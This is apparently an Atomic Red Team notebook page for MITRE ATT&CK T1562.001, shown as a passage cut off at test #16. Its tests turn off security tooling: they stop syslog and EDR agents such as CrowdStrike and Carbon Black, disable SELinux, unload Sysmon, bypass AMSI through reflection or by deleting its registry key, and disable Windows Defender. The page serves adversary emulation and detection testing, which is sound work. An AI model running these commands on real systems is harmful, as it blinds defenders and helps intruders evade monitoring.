+    <a class="reference internal nav-link" href="#atomic-test-7-disable-opendns-umbrella">
+     Atomic Test #7 - Disable OpenDNS Umbrella
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id6">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-8-stop-and-unload-crowdstrike-falcon-on-macos">
+     Atomic Test #8 - Stop and unload Crowdstrike Falcon on macOS
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id7">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-9-unload-sysmon-filter-driver">
+     Atomic Test #9 - Unload Sysmon Filter Driver
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-10-uninstall-sysmon">
+     Atomic Test #10 - Uninstall Sysmon
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id8">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-11-amsi-bypass-amsi-initfailed">
+     Atomic Test #11 - AMSI Bypass - AMSI InitFailed
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-12-amsi-bypass-remove-amsi-provider-reg-key">
+     Atomic Test #12 - AMSI Bypass - Remove AMSI Provider Reg Key
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id9">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-13-disable-arbitrary-security-windows-service">
+     Atomic Test #13 - Disable Arbitrary Security Windows Service
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id10">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-14-tamper-with-windows-defender-atp-powershell">
+     Atomic Test #14 - Tamper with Windows Defender ATP PowerShell
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id11">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-15-tamper-with-windows-defender-command-prompt">
+     Atomic Test #15 - Tamper with Windows Defender Command Prompt
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id12">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-16-tamper-with-windows-defender-registry">
+     Atomic Test #16 - Tamper with Windows Defender Registry
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id13">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-17-disable-microsoft-office-security-features">
+     Atomic Test #17 - Disable Microsoft Office Security Features
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id14">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-18-remove-windows-defender-definition-files">
+     Atomic Test #18 - Remove Windows Defender Definition Files
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id15">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         command_prompt
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-19-stop-and-remove-arbitrary-security-windows-service">
+     Atomic Test #19 - Stop and Remove Arbitrary Security Windows Service
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id16">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-20-uninstall-crowdstrike-falcon-on-windows">
+     Atomic Test #20 - Uninstall Crowdstrike Falcon on Windows
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id17">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-21-tamper-with-windows-defender-evade-scanning-folder">
+     Atomic Test #21 - Tamper with Windows Defender Evade Scanning -Folder
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id18">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-22-tamper-with-windows-defender-evade-scanning-extension">
+     Atomic Test #22 - Tamper with Windows Defender Evade Scanning -Extension
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id19">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-23-tamper-with-windows-defender-evade-scanning-process">
+     Atomic Test #23 - Tamper with Windows Defender Evade Scanning -Process
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id20">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#detection">
+   Detection
+  </a>
+ </li>
+</ul>
+
+        </nav>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+        
+              <div>
+                
+  <div class="section" id="t1562-001-impair-defenses-disable-or-modify-tools">
+<h1>T1562.001 - Impair Defenses: Disable or Modify Tools<a class="headerlink" href="#t1562-001-impair-defenses-disable-or-modify-tools" title="Permalink to this headline">¶</a></h1>
+<p>Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.</p>
+<div class="section" id="atomic-tests">
+<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this headline">¶</a></h2>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Import the Module before running the tests.</span>
+<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="mh">0x6c</span><span class="o">/</span><span class="n">AtomicRedTeam</span><span class="o">/</span><span class="n">atomics</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">atomicredteam</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicRedTeam</span><span class="o">.</span><span class="n">psd1</span> <span class="o">-</span> <span class="n">Force</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-1-disable-syslog">
+<h3>Atomic Test #1 - Disable syslog<a class="headerlink" href="#atomic-test-1-disable-syslog" title="Permalink to this headline">¶</a></h3>
+<p>Disables syslog collection</p>
+<p><strong>Supported Platforms:</strong> linux</p>
+<div class="section" id="attack-commands-run-with-sh">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#attack-commands-run-with-sh" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">[</span> <span class="k">$(</span>rpm -q --queryformat <span class="s1">&#39;%{VERSION}&#39;</span> centos-release<span class="k">)</span> -eq <span class="s2">&quot;6&quot;</span> <span class="o">]</span><span class="p">;</span>
+<span class="k">then</span>
+  service rsyslog stop
+  chkconfig off rsyslog
+<span class="k">else</span> <span class="k">if</span> <span class="o">[</span> <span class="k">$(</span>rpm -q --queryformat <span class="s1">&#39;%{VERSION}&#39;</span> centos-release<span class="k">)</span> -eq <span class="s2">&quot;7&quot;</span> <span class="o">]</span><span class="p">;</span>
+  systemctl stop rsyslog
+  systemctl disable rsyslog
+<span class="k">fi</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-2-disable-cb-response">
+<h3>Atomic Test #2 - Disable Cb Response<a class="headerlink" href="#atomic-test-2-disable-cb-response" title="Permalink to this headline">¶</a></h3>
+<p>Disable the Cb Response service</p>
+<p><strong>Supported Platforms:</strong> linux</p>
+<div class="section" id="id1">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">[</span> <span class="k">$(</span>rpm -q --queryformat <span class="s1">&#39;%{VERSION}&#39;</span> centos-release<span class="k">)</span> -eq <span class="s2">&quot;6&quot;</span> <span class="o">]</span><span class="p">;</span>
+<span class="k">then</span>
+  service cbdaemon stop
+  chkconfig off cbdaemon
+<span class="k">else</span> <span class="k">if</span> <span class="o">[</span> <span class="k">$(</span>rpm -q --queryformat <span class="s1">&#39;%{VERSION}&#39;</span> centos-release<span class="k">)</span> -eq <span class="s2">&quot;7&quot;</span> <span class="o">]</span><span class="p">;</span>
+  systemctl stop cbdaemon
+  systemctl disable cbdaemon
+<span class="k">fi</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-3-disable-selinux">
+<h3>Atomic Test #3 - Disable SELinux<a class="headerlink" href="#atomic-test-3-disable-selinux" title="Permalink to this headline">¶</a></h3>
+<p>Disables SELinux enforcement</p>
+<p><strong>Supported Platforms:</strong> linux</p>
+<div class="section" id="id2">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>setenforce <span class="m">0</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-4-stop-crowdstrike-falcon-on-linux">
+<h3>Atomic Test #4 - Stop Crowdstrike Falcon on Linux<a class="headerlink" href="#atomic-test-4-stop-crowdstrike-falcon-on-linux" title="Permalink to this headline">¶</a></h3>
+<p>Stop and disable Crowdstrike Falcon on Linux</p>
+<p><strong>Supported Platforms:</strong> linux</p>
+<div class="section" id="id3">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo systemctl stop falcon-sensor.service
+sudo systemctl disable falcon-sensor.service
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-5-disable-carbon-black-response">
+<h3>Atomic Test #5 - Disable Carbon Black Response<a class="headerlink" href="#atomic-test-5-disable-carbon-black-response" title="Permalink to this headline">¶</a></h3>
+<p>Disables Carbon Black Response</p>
+<p><strong>Supported Platforms:</strong> macos</p>
+<div class="section" id="id4">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">5</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-6-disable-littlesnitch">
+<h3>Atomic Test #6 - Disable LittleSnitch<a class="headerlink" href="#atomic-test-6-disable-littlesnitch" title="Permalink to this headline">¶</a></h3>
+<p>Disables LittleSnitch</p>
+<p><strong>Supported Platforms:</strong> macos</p>
+<div class="section" id="id5">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-7-disable-opendns-umbrella">
+<h3>Atomic Test #7 - Disable OpenDNS Umbrella<a class="headerlink" href="#atomic-test-7-disable-opendns-umbrella" title="Permalink to this headline">¶</a></h3>
+<p>Disables OpenDNS Umbrella</p>
+<p><strong>Supported Platforms:</strong> macos</p>
+<div class="section" id="id6">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">7</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-8-stop-and-unload-crowdstrike-falcon-on-macos">
+<h3>Atomic Test #8 - Stop and unload Crowdstrike Falcon on macOS<a class="headerlink" href="#atomic-test-8-stop-and-unload-crowdstrike-falcon-on-macos" title="Permalink to this headline">¶</a></h3>
+<p>Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS</p>
+<p><strong>Supported Platforms:</strong> macos</p>
+<div class="section" id="id7">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo launchctl unload <span class="c1">#{falcond_plist}</span>
+sudo launchctl unload <span class="c1">#{userdaemon_plist}</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">8</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-9-unload-sysmon-filter-driver">
+<h3>Atomic Test #9 - Unload Sysmon Filter Driver<a class="headerlink" href="#atomic-test-9-unload-sysmon-filter-driver" title="Permalink to this headline">¶</a></h3>
+<p>Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,
+run the prereq_command’s and it should fail with an error of “sysmon filter must be loaded”.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="attack-commands-run-with-command-prompt">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>fltmc.exe unload #{sysmon_driver}
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">9</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-10-uninstall-sysmon">
+<h3>Atomic Test #10 - Uninstall Sysmon<a class="headerlink" href="#atomic-test-10-uninstall-sysmon" title="Permalink to this headline">¶</a></h3>
+<p>Uninstall Sysinternals Sysmon for Defense Evasion</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id8">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>sysmon -u
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">10</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-11-amsi-bypass-amsi-initfailed">
+<h3>Atomic Test #11 - AMSI Bypass - AMSI InitFailed<a class="headerlink" href="#atomic-test-11-amsi-bypass-amsi-initfailed" title="Permalink to this headline">¶</a></h3>
+<p>Any easy way to bypass AMSI inspection is it patch the dll in memory setting the “amsiInitFailed” function to true.
+Upon execution, no output is displayed.</p>
+<p>https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="attack-commands-run-with-powershell">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;amsiInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">11</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-12-amsi-bypass-remove-amsi-provider-reg-key">
+<h3>Atomic Test #12 - AMSI Bypass - Remove AMSI Provider Reg Key<a class="headerlink" href="#atomic-test-12-amsi-bypass-remove-amsi-provider-reg-key" title="Permalink to this headline">¶</a></h3>
+<p>With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
+Open Registry Editor and navigate to “HKLM:\SOFTWARE\Microsoft\AMSI\Providers” to verify that it is gone.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id9">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}&quot;</span> <span class="n">-Recurse</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">12</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-13-disable-arbitrary-security-windows-service">
+<h3>Atomic Test #13 - Disable Arbitrary Security Windows Service<a class="headerlink" href="#atomic-test-13-disable-arbitrary-security-windows-service" title="Permalink to this headline">¶</a></h3>
+<p>With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.
+Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
+To verify that the service has stopped, run “sc query McAfeeDLPAgentService”</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id10">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>net.exe stop #{service_name}
+sc.exe config #{service_name} start= disabled
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">13</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-14-tamper-with-windows-defender-atp-powershell">
+<h3>Atomic Test #14 - Tamper with Windows Defender ATP PowerShell<a class="headerlink" href="#atomic-test-14-tamper-with-windows-defender-atp-powershell" title="Permalink to this headline">¶</a></h3>
+<p>Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
+in Windows settings.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id11">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="n">1</span>
+<span class="nb">Set-MpPreference</span> <span class="n">-DisableBehaviorMonitoring</span> <span class="n">1</span>
+<span class="nb">Set-MpPreference</span> <span class="n">-DisableScriptScanning</span> <span class="n">1</span>
+<span class="nb">Set-MpPreference</span> <span class="n">-DisableBlockAtFirstSeen</span> <span class="n">1</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">14</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-15-tamper-with-windows-defender-command-prompt">
+<h3>Atomic Test #15 - Tamper with Windows Defender Command Prompt<a class="headerlink" href="#atomic-test-15-tamper-with-windows-defender-command-prompt" title="Permalink to this headline">¶</a></h3>
+<p>Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
+However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, “Access Denied”
+will be displayed twice and the WinDefend service status will be displayed.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id12">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>sc stop WinDefend
+sc config WinDefend start=disabled
+sc query WinDefend
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">15</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-16-tamper-with-windows-defender-registry">
+<h3>Atomic Test #16 - Tamper with Windows Defender Registry<a class="headerlink" href="#atomic-test-16-tamper-with-windows-defender-registry" title="Permalink to this headline">¶</a></h3>
+<p>Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be
+grayed out and have no info.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id13">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h4>
